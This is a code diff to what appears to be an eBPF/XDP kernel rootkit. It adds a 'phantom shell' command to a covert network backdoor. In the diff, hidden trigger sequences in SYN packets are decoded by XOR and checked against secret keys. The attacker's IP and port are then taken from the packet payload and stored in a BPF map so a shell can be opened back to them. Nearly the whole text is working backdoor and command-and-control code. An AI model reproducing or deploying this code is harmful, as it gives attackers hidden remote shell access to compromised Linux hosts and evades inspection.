@@ -11,7 +11,7 @@
 #include "../../common/c&c.h"
 #include "../bpf/defs.h"
 
-int execute_key_command(int command_received){
+static __always_inline int execute_key_command(int command_received, __u32 ip, __u16 port){
     int pid = -1; //Received by network stack, just ignore
     switch(command_received){
         case CC_PROT_COMMAND_ENCRYPTED_SHELL:
@@ -26,6 +26,19 @@ int execute_key_command(int command_received){
             bpf_printk("Received request to deactivate all hooks\n");
             ring_buffer_send_backdoor_command(&rb_comm, pid, command_received);
             break;
+        case CC_PROT_COMMAND_PHANTOM_SHELL:
+            bpf_printk("Received request to start normal shell\n");
+            //Check for phantom shell state
+            __u64 key = 0;
+            struct backdoor_phantom_shell_data *ps_data = (struct backdoor_phantom_shell_data*) bpf_map_lookup_elem(&backdoor_phantom_shell, &key);
+            struct backdoor_phantom_shell_data ps_new_data = {0};
+            ps_new_data.active = 1;
+            ps_new_data.d_ip  = ip;
+            ps_new_data.d_port = port;    
+            
+            bpf_map_update_elem(&backdoor_phantom_shell, &key, &ps_new_data, BPF_ANY);
+            break;
+            
         default:
             bpf_printk("Command received unknown: %d\n", command_received);
     }
@@ -125,6 +138,21 @@ static __always_inline int manage_backdoor_trigger_v1(char* payload, __u32 paylo
         command_received = CC_PROT_COMMAND_HOOK_DEACTIVATE_ALL;
         goto backdoor_finish;
     }
+
+    correct = 1;
+    //Phantom shell request
+    __builtin_memcpy(key3, CC_TRIGGER_SYN_PACKET_KEY_3_PHANTOM_SHELL, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
+        result3[ii] = section[ii] ^ section2[ii] ^ section3[ii];
+        if(result3[ii]!=(key3[ii])){
+            correct = 0;
+        }
+    }
+    if(correct == 1){
+        //Found valid k3 value
+        command_received = CC_PROT_COMMAND_PHANTOM_SHELL;
+        goto backdoor_finish;
+    }
     
 
 backdoor_finish:
@@ -136,7 +164,12 @@ backdoor_finish:
 
     //If we reach this point then we received trigger packet
     bpf_printk("Finished backdoor V1 check with success\n");
-    execute_key_command(command_received);
+    __u32 ip;
+    __u16 port;
+    __builtin_memcpy(&ip, payload+0x01, sizeof(__u32));
+    __builtin_memcpy(&port, payload+0x05, sizeof(__u16));
+
+    execute_key_command(command_received, ip, port);
 
 
     return XDP_DROP; 
@@ -191,11 +224,11 @@ static __always_inline int manage_backdoor_trigger_v3_32(struct backdoor_packet_
         }
     }
     
-    bpf_printk("Payload before XOR: ");
+    /*bpf_printk("Payload before XOR: ");
     for(int ii=0; ii<CC_STREAM_TRIGGER_PAYLOAD_LEN_MODE_SEQ_NUM; ii++){
         bpf_printk("%x", payload[ii]);
     }
-    bpf_printk("\n");
+    bpf_printk("\n");*/
 
     //Now that we have the possible complete stream, let's search for the secret backdoor combination in it
     //First undo running XOR
@@ -204,11 +237,11 @@ static __always_inline int manage_backdoor_trigger_v3_32(struct backdoor_packet_
         __builtin_memcpy(payload+ii, (char*)&(xor_res), 0x01);
     }
 
-    bpf_printk("Payload after XOR: ");
+    /*bpf_printk("Payload after XOR: ");
     for(int ii=0; ii<CC_STREAM_TRIGGER_PAYLOAD_LEN_MODE_SEQ_NUM; ii++){
         bpf_printk("%x", payload[ii]);
     }
-    bpf_printk("\n");
+    bpf_printk("\n");*/
 
     //Now compute CRC
     __u8 x;
@@ -253,17 +286,17 @@ static __always_inline int manage_backdoor_trigger_v3_32(struct backdoor_packet_
     if(correct == 1){
         //Found valid k3 value
         command_received = CC_PROT_COMMAND_ENCRYPTED_SHELL;
-        goto backdoor_finish_v3;
+        goto backdoor_finish_v3_32;
     }
 
-backdoor_finish_v3:
+backdoor_finish_v3_32:
     //Found no valid key 3
     if(correct==0){
         bpf_printk("FAIL CHECK 3\n");
         return 0;
     }
     bpf_printk("Completed backdoor trigger v3 (32bit), b_data position: %i\n", b_data.last_packet_modified);
-    execute_key_command(command_received);
+    execute_key_command(command_received, 0, 0);
 
     return 1;
 }
@@ -336,11 +369,11 @@ static __always_inline int manage_backdoor_trigger_v3_16(struct backdoor_packet_
         }
     }
     
-    bpf_printk("Payload before XOR: ");
+    /*bpf_printk("Payload before XOR: ");
     for(int ii=0; ii<CC_STREAM_TRIGGER_PAYLOAD_LEN_MODE_SRC_PORT; ii++){
         bpf_printk("%x", payload[ii]);
     }
-    bpf_printk("\n");
+    bpf_printk("\n");*/
 
     //Now that we have the possible complete stream, let's search for the secret backdoor combination in it
     //First undo running XOR
@@ -349,11 +382,11 @@ static __always_inline int manage_backdoor_trigger_v3_16(struct backdoor_packet_
         __builtin_memcpy(payload+ii, (char*)&(xor_res), 0x01);
     }
 
-    bpf_printk("Payload after XOR: ");
+    /*bpf_printk("Payload after XOR: ");
     for(int ii=0; ii<CC_STREAM_TRIGGER_PAYLOAD_LEN_MODE_SRC_PORT; ii++){
         bpf_printk("%x", payload[ii]);
     }
-    bpf_printk("\n");
+    bpf_printk("\n");*/
 
     //Now compute CRC
     __u8 x;
@@ -398,17 +431,17 @@ static __always_inline int manage_backdoor_trigger_v3_16(struct backdoor_packet_
     if(correct == 1){
         //Found valid k3 value
         command_received = CC_PROT_COMMAND_ENCRYPTED_SHELL;
-        goto backdoor_finish_v3;
+        goto backdoor_finish_v3_16;
     }
 
-backdoor_finish_v3:
+backdoor_finish_v3_16:
     //Found no valid key 3
     if(correct==0){
         bpf_printk("FAIL CHECK 3\n");
         return 0;
     }
     bpf_printk("Completed backdoor trigger v3 (16bit), b_data position: %i\n", b_data.last_packet_modified);
-    execute_key_command(command_received);
+    execute_key_command(command_received, 0, 0);
 
     return 1;
 }
